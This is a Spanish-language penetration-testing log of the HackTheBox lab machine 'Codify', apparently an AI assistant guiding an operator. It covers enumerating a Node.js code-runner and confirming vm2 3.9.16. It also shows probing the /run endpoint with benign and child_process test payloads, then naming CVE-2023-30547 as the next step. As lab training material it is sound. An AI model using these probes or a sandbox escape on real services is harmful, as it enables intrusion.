106:            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: red;">Error: ${data.error}</textarea>`;
108:            output.innerHTML = `<textarea  rows="10" cols="50" class="form-control h-100" style="color: green;">${data.output}</textarea>`;
117:  </script>

   4   │ <head>
   5   │     <meta charset="UTF-8">
   6   │     <meta name="viewport" content="width=device-width, initial-scale=1.0">
   7   │     <title>About Us | Codify</title>
   8   │     <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
   9   │ </head>
  10   │
  11   │ <body>
  12   │     <nav class="navbar navbar-expand-lg navbar-light bg-light">
  13   │         <a class="navbar-brand" href="/">Codify</a>
  14   │         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
  15   │           <span class="navbar-toggler-icon"></span>
  16   │         </button>
  17   │         <div class="collapse navbar-collapse" id="navbarNav">
  18   │           <ul class="navbar-nav">
  19   │             <li class="nav-item">
  20   │               <a class="nav-link" href="/editor">Editor</a>
  21   │             </li>
  22   │           </ul>
  23   │           <ul class="navbar-nav">
  24   │             <li class="nav-item">
  25   │               <a class="nav-link" href="/about">About us</a>
  26   │             </li>
  27   │           </ul>
  28   │         </div>
  29   │       </nav>
  30   │
  31   │     <div class="container mt-4">
  32   │         <h1 class="text-center mb-4">About Us</h1>
  33   │         <p>At Codify, our mission is to make it easy for developers to test their Node.js code. We understand that testing your code can be time-consuming and difficult, which is why we built this platform to simpl
       │ ify the process.</p>
  34   │         <p>Our team is made up of experienced developers who are passionate about creating tools that make development easier. We're committed to providing a reliable and secure platform that you can trust to test
       │ your code.</p>
  35   │         <p>Thank you for using Codify, and we hope that our platform helps you develop better Node.js applications.</p>
  36   │     </div>
  37   │
  38   │     <div class="container mt-4">
  39   │                 <h2 class="text-center mb-3"> About Our Code Editor</h2>
  40   │                     <p><strong></strong> Our code editor is a powerful tool that allows developers to write and test Node.js code in a user-friendly environment. You can write and run your JavaScript code directly
       │ in the browser, making it easy to experiment and debug your applications.</p>
  41   │                     <p><strong></strong> The </strong><a href="https://github.com/patriksimek/vm2/releases/tag/3.9.16" tar
  42   │                     get="_blank">vm2</a> library is a widely used and trusted tool for sandboxing JavaScript. It adds an extra layer of security to prevent potentially harmful code from causing harm to your system.
       │  We take the security and reliability of our platform seriously, and we use vm2 to ensure a safe testing environment for your code.</p>
  43   │                             </div>
  44   │
  45   │     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
  46   │     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  47   │     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  48   │ </body>
  49   │
  50   │ </html>
───────┴───────────
 12   │         <a class="navbar-brand" href="/">Codify</a>
  13   │         <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
  14   │           <span class="navbar-toggler-icon"></span>
  15   │         </button>
  16   │         <div class="collapse navbar-collapse" id="navbarNav">
  17   │           <ul class="navbar-nav">
  18   │             <li class="nav-item">
  19   │               <a class="nav-link" href="/editor">Editor</a>
  20   │             </li>
  21   │           </ul>
  22   │           <ul class="navbar-nav">
  23   │             <li class="nav-item">
  24   │               <a class="nav-link" href="/about">About us</a>
  25   │             </li>
  26   │           </ul>
  27   │         </div>
  28   │       </nav>
  29   │
  30   │     <div class="container my-4">
  31   │         <h1 class="text-center">Limitations</h1>
  32   │         <hr>
  33   │         <p>The Codify platform allows users to write and run Node.js code online, but there are certain limitations in place to ensure the security of the platform and its users.</p>
  34   │         <h4>Restricted Modules</h4>
  35   │         <p>The following Node.js modules have been restricted from importing:</p>
  36   │         <ul>
  37   │             <li>child_process</li>
  38   │             <li>fs</li>
  39   │
  40   │         </ul>
  41   │         <p>This is to prevent users from executing arbitrary system commands, which could be a major security risk.</p>
  42   │         <h4>Module Whitelist</h4>
  43   │     <p>Only a limited set of modules are available to be imported. Some of them are listed below. If you need a specific module that is not available, please contact the administrator by mailing <a href='mailto:sup
       │ port@codify.htb'>support@codify.htb</a> while our ticketing system is being migrated. </p>
  44   │         <ul>
  45   │             <li>url</li>
  46   │             <li>crypto</li>
  47   │             <li>util</li>
  48   │             <li>events</li>
  49   │             <li>assert</li>
  50   │             <li>stream</li>
  51   │             <li>path</li>
  52   │             <li>os</li>
  53   │             <li>zlib</li>
  54   │         </ul>
  55   │     </div>
  56   │
  57   │     <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
  58   │     <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
  59   │     <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
  60   │ </body>
  61   │ </html>

### Objetivo

Cerrar **WEB-BASE** y activar el flujo post-fase 1 por producto/versionado: `vm2 3.9.16`.

El siguiente paso único es validar de forma benigna el endpoint `/run` para confirmar cómo recibe y ejecuta código el backend, sin pasar todavía a explotación.

### Hechos verificados

La página `/about` identifica explícitamente la librería usada para sandboxing:

```text
vm2
```

Además, el enlace apunta a:

```text
https://github.com/patriksimek/vm2/releases/tag/3.9.16
```

Esto es una señal fuerte de versión, aunque metodológicamente se conserva como **versión observada en la propia aplicación**, no como versión binaria confirmada desde el sistema.

La página `/limitations` confirma que la aplicación permite ejecutar código Node.js, pero bloquea módulos sensibles:

```text
Restricted Modules:
- child_process
- fs
```

También lista módulos permitidos:

```text
url
crypto
util
events
assert
stream
path
os
zlib
```

La página `/editor` muestra el flujo real del editor:

```text
textarea id="code"
button onclick="runCode()"
fetch('/run', {
  method: 'POST',
  body: JSON.stringify({ code: encodedCode })
})
```

El código introducido en el editor se codifica en Base64 con:

```text
btoa(code)
```

y se envía al endpoint:

```text
POST /run
```

Candidata pública relevante: **CVE-2023-30547**. NVD y GitHub Advisory indican que afecta a `vm2` hasta `3.9.16`, permite escapar del sandbox por sanitización incorrecta de excepciones y fue corregida en `3.9.17`. ([NVD][1])

### Suposiciones

La aplicación probablemente usa `vm2 3.9.16` o una versión equivalente vulnerable, porque la propia página enlaza esa release concreta.

La restricción de `child_process` y `fs` indica que los desarrolladores son conscientes del riesgo de ejecución de comandos o lectura de ficheros, pero eso no demuestra que el sandbox sea seguro.

El endpoint `/run` es a continuación el punto técnico dominante, porque es el flujo real que recibe código del usuario y lo manda al backend.

### Método

Cambio de rama metodológico:

```text
WEB-BASE
-> producto/librería identificada
-> versión observada
-> endpoint real de ejecución localizado
-> flujo post-fase 1 y versionado
```

Clasificación de candidatas:

```text
CVE-2023-30547 -> plausible
CVE-2023-29199 -> más débil para esta evidencia, porque las fuentes la acotan hasta versiones anteriores a 3.9.16
```

La candidata que mejor encaja es **CVE-2023-30547**, no por precipitar la explotación, sino porque:

* la aplicación usa `vm2`;
* la propia app apunta a `3.9.16`;
* la funcionalidad consiste en ejecutar código no confiable;
* existe un endpoint `/run`;
* hay restricciones defensivas de módulos;
* las fuentes públicas sitúan `3.9.16` dentro del rango afectado. ([NVD][1])

### Análisis

Este hallazgo proporciona la primera pieza importante de Codify:

```text
Aplicación Node.js/Express
-> editor de código JavaScript
-> sandbox vm2
-> versión observada 3.9.16
-> endpoint POST /run
-> código enviado en Base64 dentro de JSON
```

La ruta deja de ser una enumeración web genérica. A continuación se entra en una revisión de **sandbox JavaScript vulnerable**.

Antes de tocar ninguna PoC, hay que validar el flujo benigno de `/run`. Esto permitirá confirmar si:

* el endpoint acepta JSON;
* el parámetro `code` debe ir codificado en Base64;
* el backend ejecuta el código;
* la salida vuelve como `output`;
* los errores vuelven como `error`.

El error observado en el bucle no pertenece al objetivo, sino a la shell local. En `zsh`, `path` es una variable especial relacionada con `$PATH`. Al hacer:

```bash
for path in /about /limitations /editor; do
```

se sobrescribió temporalmente la variable `path`, y por eso `curl`, `grep` y `sort` dejaron de encontrarse. Este comportamiento de `zsh` puede provocar errores locales durante la ejecución.

Se utiliza otro nombre de variable, por ejemplo `ruta`.

### Comandos

Primero, validación benigna del endpoint `/run`.

```bash
node -e 'console.log(Buffer.from("console.log(\"HTB-Codify-test\")").toString("base64"))'
```

Por qué: el frontend usa `btoa(code)`, así que desde terminal se necesita enviar el código ya codificado en Base64.

Resultado esperado: una cadena Base64 que representa este código benigno:

```javascript
console.log("HTB-Codify-test")
```

---

Con esa cadena se prueba `/run`:

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"<BASE64_AQUI>"}' | jq
```

Qué hace: reproduce desde terminal lo que hace el editor en navegador.

Resultado esperado:

```json
{
  "output": "HTB-Codify-test\n"
}
```

o una estructura equivalente.

Qué parte interesa de verdad:

* si responde `output`;
* si responde `error`;
* si el endpoint exige otro formato;
* si el puerto `80` funciona igual que `3000`.

---

Se prueba también contra el puerto directo `3000`:

```bash
curl -sS -X POST http://codify.htb:3000/run \
  -H "Content-Type: application/json" \
  -d '{"code":"<BASE64_AQUI>"}' | jq
```

Por qué: se confirma si Apache en `80` y Express en `3000` exponen exactamente el mismo backend.

---

Se corrige el bucle de rutas usando `ruta`, no `path`:

```bash
for ruta in /about /limitations /editor; do
  echo "### $ruta"
  curl -sS "http://codify.htb$ruta" | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
  echo
done
```

### Comprobaciones

Se registra la salida de:

```bash
node -e 'console.log(Buffer.from("console.log(\"HTB-Codify-test\")").toString("base64"))'
```

y de:

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"<BASE64_AQUI>"}' | jq
```

Con esa evidencia se cierra la verificación benigna de ejecución y queda justificado el siguiente salto metodológico:

```text
vm2 3.9.16 observado
-> CVE-2023-30547 plausible
-> /run validado
-> operador revisa/valida PoC en laboratorio
-> vuelve con evidencia real de resultado
```

### Ejecución

❯ cd /home/r4mon/pentest/targets/HTB/easy/Codify
❯ node -e 'console.log(Buffer.from("console.log(\"HTB-Codify-test\")").toString("base64"))'
Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp
❯ curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp"}' | jq
{
  "output": "HTB-Codify-test\r\n"
}
❯ curl -sS -X POST http://codify.htb:3000/run \
  -H "Content-Type: application/json" \
  -d '{"code":"Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp"}' | jq
{
  "output": "HTB-Codify-test\r\n"
}
❯ for ruta in /about /limitations /editor; do
  echo "### $ruta"
  curl -sS "http://codify.htb$ruta" | grep -oP 'href="\K[^"]+|src="\K[^"]+' | sort -u
  echo
done
### /about
/
/about
/editor
https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js
https://code.jquery.com/jquery-3.3.1.slim.min.js
https://github.com/patriksimek/vm2/releases/tag/3.9.16
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js

### /limitations
/
/about
/editor
https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js
https://code.jquery.com/jquery-3.3.1.slim.min.js
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js

### /editor
/
/about
https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css

❯ node -e 'console.log(Buffer.from("console.log(\"HTB-Codify-test\")").toString("base64"))'
Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp

### Objetivo

Cerrar la validación benigna de `/run` y dejar justificado el cambio de fase hacia **análisis de candidata pública sobre `vm2 3.9.16`**.

### Hechos verificados

El endpoint `/run` acepta JSON con el parámetro `code` codificado en Base64.

El código benigno:

```javascript
console.log("HTB-Codify-test")
```

codificado como:

```text
Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp
```

se ejecuta correctamente tanto por el frontal Apache como por el puerto directo de Express:

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

También queda verificado que:

```text
http://codify.htb/run
http://codify.htb:3000/run
```

apuntan al mismo backend funcional.

La ruta `/about` enlaza explícitamente a:

```text
vm2 3.9.16
```

La ruta `/limitations` declara restricciones sobre módulos sensibles, especialmente:

```text
child_process
fs
```

### Suposiciones

`codify.htb:3000` es la aplicación Express directa.

`codify.htb` en el puerto `80` es el frontal Apache que enruta hacia la misma aplicación.

La versión `vm2 3.9.16` es una señal fuerte, porque la propia aplicación enlaza esa release concreta, pero sigue siendo correcto llamarla **versión observada por evidencia web**, no versión confirmada desde filesystem.

La candidata principal pasa a ser una vulnerabilidad pública de escape de sandbox en `vm2` compatible con esa versión.

### Método

La cadena metodológica actual queda así:

```text
Fase 1
-> WEB-BASE
-> aplicación Node.js/Express
-> sandbox vm2
-> versión observada 3.9.16
-> endpoint /run validado benignamente
-> flujo post-fase 1 y versionado
```

Ya no merece la pena seguir haciendo fuzzing genérico a ciegas. La propia aplicación ha mostrado qué componente usa y qué funcionalidad expone.

### Análisis

La observación principal queda cerrada: **el backend ejecuta código JavaScript enviado por el usuario dentro del sandbox `vm2`**.

La prueba es limpia porque no intenta escapar del sandbox ni interactuar con el sistema; solo confirma el flujo real:

```text
textarea del editor
-> btoa()
-> POST /run
-> JSON {"code":"..."}
-> ejecución
-> respuesta JSON con output
```

El hallazgo dominante en este punto es:

```text
vm2 3.9.16 + ejecución de código Node.js en /run
```

Eso justifica activar el flujo de análisis de candidata pública. En este punto, el análisis se limita a ordenar la evidencia y la aplicabilidad; la validación práctica de PoC, adaptación y explotación queda en el tramo operativo.

### Comandos

Se guarda esta evidencia en un archivo para el MD:

````bash
mkdir -p notes/evidencias

cat > notes/evidencias/02_validacion_benigna_run.md <<'EOF'
### Validación benigna del endpoint /run

Se validó que el editor envía código JavaScript codificado en Base64 al endpoint `/run`.

Código probado:

```javascript
console.log("HTB-Codify-test")
````

Cadena Base64:

```text
Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp
```

Respuesta en `http://codify.htb/run`:

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

Respuesta en `http://codify.htb:3000/run`:

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

Conclusión: tanto el frontal Apache como el puerto directo de Express alcanzan el mismo backend de ejecución.
EOF

````

Siguiente verificación corta y todavía benigna: comprobar una funcionalidad permitida por la whitelist, por ejemplo el módulo `os`.

```bash
node -e 'console.log(Buffer.from("const os = require(\"os\"); console.log(os.platform())").toString("base64"))'
````

Luego se envía el resultado a `/run`:

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"<BASE64_AQUI>"}' | jq
```

Por qué: `/limitations` dice que `os` está permitido. Esta prueba no explota nada; solo confirma que la whitelist funciona como declara la aplicación.

Después, como control defensivo, se valida que un módulo bloqueado realmente falla:

```bash
node -e 'console.log(Buffer.from("require(\"child_process\")").toString("base64"))'
```

Y repetir el POST a `/run`.

Resultado esperado: un error relacionado con módulo restringido o no permitido. Esa salida será útil porque demuestra que la aplicación intenta aplicar controles, aunque la seguridad final dependa de `vm2`.

### Comprobaciones

Se registran únicamente estas dos salidas:

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"<BASE64_OS_AQUI>"}' | jq
```

y:

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"<BASE64_CHILD_PROCESS_AQUI>"}' | jq
```

Con ello queda documentado:

```text
ejecución benigna funciona
módulo permitido funciona o falla
módulo sensible bloqueado falla
```

### Ejecución

curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"<BASE64_CHILD_PROCESS_AQUI>"}' | jq

### Objetivo

Corregir el error local y seguir con una comprobación completa, sin placeholders ni pasos dependientes incompletos.

### Hechos verificados

El endpoint `/run` sigue funcionando correctamente con la prueba benigna:

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

El error de Node.js fue **local**, no del objetivo:

```text
TypeError [ERR_UNKNOWN_ENCODING]: Unknown encoding
```

Lo provocó esta parte:

```bash
.toString("Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp")
```

Ahí `toString()` esperaba un nombre de codificación, por ejemplo:

```text
base64
```

pero recibió la cadena Base64 anterior como si fuese un tipo de encoding.

### Suposiciones

El fichero `notes/evidencias/02_validacion_benigna_run.md` probablemente quedó incompleto porque el heredoc se abrió y no se cerró con `EOF`.

### Método

Se usa una instrucción autocontenida que genera el JSON correcto internamente y lo envía a `/run`, sin necesidad de copiar salidas intermedias.

### Análisis

Para probar el bloqueo de `child_process`, se usa este comando completo:

### Comandos

```bash
curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp"}' | jq
```

Ese Base64 corresponde exactamente a:

```javascript
require("child_process")
```

### Comprobaciones

Se registra la salida.

El resultado esperado es una respuesta de error o bloqueo. Si falla como módulo restringido, quedará documentado que la aplicación sí aplica restricciones superficiales sobre módulos peligrosos.

### Ejecución

❯ curl -sS -X POST http://codify.htb/run \
  -H "Content-Type: application/json" \
  -d '{"code":"cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp"}' | jq
{
  "error": "Module \"child_process\" is not allowed"
}

### Objetivo

Cerrar la comprobación de módulos restringidos y dejar documentado que `/run` ejecuta código JavaScript, pero aplica una capa de filtrado sobre módulos peligrosos.

### Hechos verificados

El endpoint `/run` ejecuta código benigno correctamente:

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

La aplicación bloquea explícitamente el módulo `child_process`:

```json
{
  "error": "Module \"child_process\" is not allowed"
}
```

Esto confirma que la restricción anunciada en `/limitations` no es solo decorativa: el backend aplica una validación sobre módulos importados.

### Suposiciones

La protección aplicada por la aplicación parece estar orientada a bloquear módulos peligrosos por nombre.

Esto no demuestra que el sandbox sea seguro. Solo demuestra que existe una capa de restricción previa o integrada sobre `require()`.

El hallazgo dominante sigue siendo:

```text
vm2 3.9.16 + ejecución de código JavaScript en /run + bloqueo superficial de módulos sensibles
```

### Método

La secuencia didáctica queda bien cerrada así:

```text
1. Identificar aplicación Node.js/Express.
2. Confirmar que usa vm2 como sandbox.
3. Observar versión 3.9.16 enlazada desde /about.
4. Identificar endpoint /run.
5. Validar ejecución benigna.
6. Validar bloqueo de módulo sensible.
7. Pasar a análisis de candidata pública.
```

Este orden es importante: no se llega a la hipótesis de sandbox escape por intuición, sino por evidencia acumulada.

### Análisis

Esta salida permite establecer una lectura clara:

```text
La aplicación permite ejecutar JavaScript controlado por el usuario, pero bloquea módulos sensibles como child_process.
```

Eso encaja perfectamente con una aplicación que confía en `vm2` para aislar código no confiable. La pregunta metodológica a continuación ya no es “¿puedo importar `child_process` directamente?”, porque la propia aplicación lo bloquea.

La pregunta correcta pasa a ser:

```text
¿la versión observada de vm2 tiene una vulnerabilidad pública que permita escapar del sandbox pese a esas restricciones?
```

Según la bitácora oficial de la máquina, la línea de análisis que corresponde es `CVE-2023-30547`, asociada a escape de sandbox en `vm2` y aplicable a la versión observada en la aplicación.

### Comandos

Primero se repara y se deja correctamente escrita la evidencia que quedó cortada por el `heredoc`.

Ejecución del bloque completo:

````bash
cat > notes/evidencias/02_validacion_benigna_run.md <<'EOF'
### Validación benigna del endpoint /run

Se validó que el editor envía código JavaScript codificado en Base64 al endpoint `/run`.

#### Código benigno probado

```javascript
console.log("HTB-Codify-test")
````

#### Cadena Base64 enviada

```text
Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp
```

#### Análisis observada

```json
{
  "output": "HTB-Codify-test\r\n"
}
```

La misma prueba funcionó tanto contra `http://codify.htb/run` como contra `http://codify.htb:3000/run`, confirmando que el puerto 80 y el puerto 3000 alcanzan el mismo backend Express.

### Comprobación de módulos restringidos

La página `/limitations` indica que módulos como `child_process` y `fs` están restringidos.

Se comprobó el módulo `child_process` enviando código equivalente a:

```javascript
require("child_process")
```

#### Cadena Base64 enviada

```text
cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp
```

#### Análisis observada

```json
{
  "error": "Module \"child_process\" is not allowed"
}
```

### Conclusión

El endpoint `/run` ejecuta código JavaScript enviado por el usuario, pero aplica una restricción sobre módulos sensibles. Esto confirma que existe una capa defensiva, aunque la seguridad real depende de la robustez del sandbox `vm2`.
EOF

````

Después se comprueba que el archivo quedó correctamente generado:

```bash
sed -n '1,220p' notes/evidencias/02_validacion_benigna_run.md
````

### Comprobaciones

Se registra únicamente la salida de:

```bash
sed -n '1,220p' notes/evidencias/02_validacion_benigna_run.md
```

Así se confirma que la evidencia queda limpia antes de pasar al siguiente bloque.

### Notas para el informe técnico

Bloque listo para incorporar:

```md
### Validación de restricciones del sandbox

Después de confirmar que `/run` ejecutaba código JavaScript benigno, se comprobó si las restricciones declaradas por la aplicación se aplicaban realmente.

La prueba con `require("child_process")` devolvió el error `Module "child_process" is not allowed`, confirmando que la aplicación bloquea módulos sensibles. Este resultado no invalida la hipótesis de explotación; al contrario, ayuda a entender el modelo defensivo: la aplicación intenta impedir acceso directo a módulos peligrosos y delega la seguridad del aislamiento en `vm2`.

Con esta evidencia, la investigación deja de centrarse en una importación directa de módulos y pasa al análisis de vulnerabilidades públicas de escape de sandbox que afecten a la versión observada de `vm2`.
```

Estado actual:

```text
Hallazgo dominante: ejecución JavaScript en /run con vm2 3.9.16 y bloqueo de child_process
Rama principal activa: análisis de candidata pública sobre vm2
Ramas secundarias: SSH pendiente de credenciales
Siguiente paso único: dejar la evidencia limpia en notas y pasar después al análisis de aplicabilidad de CVE-2023-30547
```
### Objetivo

Corregir el problema con el archivo de evidencias y recrearlo de forma limpia, sin `heredoc` roto y sin bloques Markdown que puedan cortarte el pegado.

### Hechos verificados

El fichero no existe en la ruta esperada:

```text
notes/evidencias/02_validacion_benigna_run.md
```

El error fue:

```text
sed: no se puede leer notes/evidencias/02_validacion_benigna_run.md: No existe el fichero o el directorio
```

La causa más probable es que el `heredoc` anterior quedara incompleto al copiar bloques con triple comilla Markdown dentro del propio contenido.

### Suposiciones

Se parte del directorio correcto de la máquina:

```text
/home/r4mon/pentest/targets/HTB/easy/Codify
```

Pero el subdirectorio `notes/evidencias/` o el fichero concreto no llegaron a crearse correctamente.

### Método

Se aplica un método más robusto:

* crear el directorio si no existe;
* generar el `.md` sin bloques de triple backtick dentro del contenido;
* comprobar inmediatamente que el archivo existe;
* mostrarlo por pantalla.

### Análisis

La incidencia se debe a que el bloque anterior era delicado de copiar: contenía un `heredoc` con bloques Markdown dentro, lo que podía dejar el fichero incompleto.

Se rehace de forma simple y limpia.

### Comandos

Ejecución del bloque completo:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Codify

mkdir -p notes/evidencias

cat > notes/evidencias/02_validacion_benigna_run.md <<'EOF'
### Validación benigna del endpoint /run

Se validó que el editor envía código JavaScript codificado en Base64 al endpoint `/run`.

#### Código benigno probado

    console.log("HTB-Codify-test")

#### Cadena Base64 enviada

    Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp

#### Análisis observada

    {
      "output": "HTB-Codify-test\r\n"
    }

La misma prueba funcionó tanto contra `http://codify.htb/run` como contra `http://codify.htb:3000/run`, confirmando que el puerto 80 y el puerto 3000 alcanzan el mismo backend Express.

### Comprobación de módulos restringidos

La página `/limitations` indica que módulos como `child_process` y `fs` están restringidos.

Se comprobó el módulo `child_process` enviando código equivalente a:

    require("child_process")

#### Cadena Base64 enviada

    cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp

#### Análisis observada

    {
      "error": "Module \"child_process\" is not allowed"
    }

### Conclusión

El endpoint `/run` ejecuta código JavaScript enviado por el usuario, pero aplica una restricción sobre módulos sensibles.

Esto confirma que existe una capa defensiva, aunque la seguridad real depende de la robustez del sandbox `vm2`.

Con esta evidencia, la investigación deja de centrarse en una importación directa de módulos y pasa al análisis de vulnerabilidades públicas de escape de sandbox que afecten a la versión observada de `vm2`.
EOF

ls -la notes/evidencias/
sed -n '1,220p' notes/evidencias/02_validacion_benigna_run.md
```

### Comprobaciones

Se registra la salida completa de ese bloque.

Interesa verificar dos puntos:

```text
1. Que el fichero ya existe.
2. Que el contenido ha quedado completo y legible.
```

### Notas para el informe técnico

Esta incidencia también deja una lección práctica útil:

```md
Cuando se documentan evidencias desde terminal mediante `heredoc`, conviene evitar bloques Markdown con triple comilla dentro del propio contenido, porque pueden romper el copiado desde el chat o dejar el fichero incompleto.
```

Estado actual:

```text
Hallazgo dominante: /run ejecuta JavaScript en vm2 y bloquea child_process.
Rama principal activa: análisis de candidata pública sobre vm2.
Ramas secundarias: SSH pendiente de credenciales.
Siguiente paso único: recrear y verificar el archivo de evidencia antes de continuar.
```
### Ejecución

ls -la notes/evidencias/
sed -n '1,220p' notes/evidencias/02_validacion_benigna_run.md
preexec: permiso denegado: /run
preexec: no existe el fichero o el directorio: http://codify.htb/run
preexec: no existe el fichero o el directorio: http://codify.htb:3000/run
preexec: no existe el fichero o el directorio: /limitations
preexec: command not found: child_process
preexec: command not found: fs
preexec: command not found: child_process
preexec: permiso denegado: /run
preexec: command not found: vm2
preexec: command not found: vm2
drwxr-xr-x r4mon r4mon  56 B  Wed May  6 17:21:40 2026  .
drwxr-xr-x r4mon r4mon 120 B  Wed May  6 17:21:40 2026  ..
.rw-r--r-- r4mon r4mon 1.4 KB Wed May  6 17:21:40 2026  02_validacion_benigna_run.md
### Validación benigna del endpoint /run

Se validó que el editor envía código JavaScript codificado en Base64 al endpoint `/run`.

#### Código benigno probado

    console.log("HTB-Codify-test")

#### Cadena Base64 enviada

    Y29uc29sZS5sb2coIkhUQi1Db2RpZnktdGVzdCIp

#### Análisis observada

    {
      "output": "HTB-Codify-test\r\n"
    }

La misma prueba funcionó tanto contra `http://codify.htb/run` como contra `http://codify.htb:3000/run`, confirmando que el puerto 80 y el puerto 3000 alcanzan el mismo backend Express.

### Comprobación de módulos restringidos

La página `/limitations` indica que módulos como `child_process` y `fs` están restringidos.

Se comprobó el módulo `child_process` enviando código equivalente a:

    require("child_process")

#### Cadena Base64 enviada

    cmVxdWlyZSgiY2hpbGRfcHJvY2VzcyIp

#### Análisis observada

    {
      "error": "Module \"child_process\" is not allowed"
    }

### Conclusión

El endpoint `/run` ejecuta código JavaScript enviado por el usuario, pero aplica una restricción sobre módulos sensibles.

Esto confirma que existe una capa defensiva, aunque la seguridad real depende de la robustez del sandbox `vm2`.

Con esta evidencia, la investigación deja de centrarse en una importación directa de módulos y pasa al análisis de vulnerabilidades públicas de escape de sandbox que afecten a la versión observada de `vm2`.

### Objetivo

Cerrar la incidencia del archivo de evidencia y pasar al siguiente bloque metodológico: **aplicabilidad de `vm2 3.9.16` y CVE-2023-30547**.

### Hechos verificados

El archivo ya existe correctamente:

```text
notes/evidencias/02_validacion_benigna_run.md
```

Tiene tamaño aproximado de `1.4 KB` y el contenido se muestra completo.

Queda documentado:

```text
/run ejecuta JavaScript enviado en Base64.
```

También queda documentado:

```text
child_process está bloqueado con el error:
Module "child_process" is not allowed
```

Los errores previos tipo:

```text
preexec: permiso denegado: /run
preexec: command not found: vm2
```

no afectan al objetivo ni a la aplicación. Son errores locales de shell al interpretar fragmentos con backticks o texto Markdown durante el pegado/ejecución.

### Suposiciones

La evidencia ya está suficientemente limpia para el MD.

No se necesita repetir esta parte.

El siguiente paso ya no es enumeración web general, sino análisis de la vulnerabilidad pública asociada a `vm2 3.9.16`.

### Método

La cadena queda cerrada así:

```text
Node.js/Express
-> editor web
-> POST /run
-> código Base64
-> ejecución benigna confirmada
-> child_process bloqueado
-> sandbox vm2 3.9.16 observado
-> candidata pública: CVE-2023-30547
```

Este es un cambio de rama justificado por evidencia, no por intuición.

### Análisis

Aunque aparecieron mensajes `preexec`, el fichero quedó creado correctamente y contiene la evidencia necesaria.

Queda claro que la vía no consiste en importar `child_process` directamente, porque la aplicación lo bloquea. La vía conceptual es distinta:

```text
escapar del sandbox vm2
```

Según la bitácora oficial y la evidencia observada, la candidata principal es:

```text
CVE-2023-30547
```

Encaja porque:

* la aplicación usa `vm2`;
* la web enlaza la versión `3.9.16`;
* el endpoint `/run` ejecuta código no confiable;
* `child_process` está bloqueado de forma directa;
* la vulnerabilidad apunta precisamente a escapar del aislamiento del sandbox.

### Comandos

No se incluye todavía ningún comando nuevo de explotación.

El siguiente paso pertenece al **tramo operativo**:

```text
Validar en laboratorio, usando la bitácora oficial como guía, si CVE-2023-30547 permite escapar de vm2 y obtener una ejecución mínima verificable.
```

La información que debe registrarse después es únicamente la evidencia observada, por ejemplo:

```text
respuesta de /run
usuario obtenido
error exacto
si ejecutó o no ejecutó
si la salida muestra contexto del sistema
```

### Comprobaciones

Antes de seguir, el estado queda así:

```text
Hallazgo dominante:
vm2 3.9.16 observado en aplicación Node.js con ejecución de código en /run.

Rama principal activa:
análisis de candidata pública vm2 / CVE-2023-30547.

Ramas secundarias:
SSH abierto, pendiente de credenciales.

Siguiente paso único:
operador valida la candidata pública en laboratorio y devuelve evidencia real de ejecución o error.
```

### Notas para el informe técnico

Bloque para incorporar después de la validación de `/run`:

```md
### Cambio de foco tras validar las restricciones

La prueba con `require("child_process")` confirmó que la aplicación bloquea módulos sensibles de Node.js. Este resultado no descarta la vía de explotación, sino que aclara el modelo defensivo de la aplicación.

